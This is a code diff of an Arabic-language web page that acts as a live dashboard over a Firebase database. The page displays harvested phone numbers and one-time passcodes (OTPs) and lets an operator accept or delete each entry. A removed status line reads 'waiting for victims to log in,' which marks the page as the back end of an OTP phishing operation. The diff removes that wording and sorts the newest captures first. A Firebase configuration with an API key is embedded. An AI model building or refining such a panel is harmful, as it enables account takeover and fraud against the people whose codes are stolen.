@@ -36,9 +36,9 @@
 
 <script type="module">
     import { initializeApp } from "https://www.gstatic.com/firebasejs/10.0.0/firebase-app.js";
+    // أضفنا query و orderBy هنا
     import { getFirestore, collection, onSnapshot, query, orderBy, doc, deleteDoc } from "https://www.gstatic.com/firebasejs/10.0.0/firebase-firestore.js";
 
-    // إعداداتك التي أرسلتها
     const firebaseConfig = {
       apiKey: "AIzaSyC05uAGTFE_mZyByFBTRexYn5VbTfzW0Go",
       authDomain: "barq-9ba61.firebaseapp.com",
@@ -53,14 +53,15 @@
 
     const dataList = document.getElementById('dataList');
 
-    // جلب البيانات مع ترتيبها (الأحدث أولاً)
-    const q = query(collection(db, "users")); 
+    // --- التعديل الجوهري هنا ---
+    // نقوم بعمل استعلام يرتب حسب الوقت (timestamp) بشكل تنازلي (desc)
+    const q = query(collection(db, "users"), orderBy("timestamp", "desc"));
 
     onSnapshot(q, (snapshot) => {
         dataList.innerHTML = "";
         
         if (snapshot.empty) {
-            dataList.innerHTML = '<div class="no-data">قاعدة البيانات فارغة حالياً. بانتظار دخول ضحايا...</div>';
+            dataList.innerHTML = '<div class="no-data">قاعدة البيانات فارغة حالياً.</div>';
             return;
         }
 
@@ -73,11 +74,11 @@
             card.innerHTML = `
                 <div class="info">
                     <div>جوال: <span class="phone">${data.phone || '---'}</span></div>
-                    <div>الرمز: <span class="otp">${data.otp || 'بانتظار الإدخال...'}</span></div>
+                    <div>الرمز: <span class="otp">${data.otp || 'بانتظار...'}</span></div>
                 </div>
                 <div class="actions">
-                    <button class="btn accept" onclick="alert('تم قبول رقم: ${data.phone}')">قبول ✅</button>
-                    <button class="btn reject" data-id="${id}">رفض/حذف ❌</button>
+                    <button class="btn accept" onclick="alert('تم القبول')">قبول ✅</button>
+                    <button class="btn reject" data-id="${id}">حذف ❌</button>
                 </div>
             `;
             dataList.appendChild(card);
@@ -87,16 +88,14 @@
         document.querySelectorAll('.reject').forEach(btn => {
             btn.onclick = async (e) => {
                 const docId = e.target.getAttribute('data-id');
-                if(confirm('هل تريد حذف هذا الرقم من القائمة؟')) {
+                if(confirm('هل تريد حذف هذا السجل؟')) {
                     await deleteDoc(doc(db, "users", docId));
                 }
             };
         });
-    }, (error) => {
-        dataList.innerHTML = `<div class="no-data" style="color:red;">خطأ في الصلاحيات: تأكد من تعديل الـ Rules في Firebase إلى true.</div>`;
-        console.error(error);
     });
 </script>
+
 
 </body>
 </html>
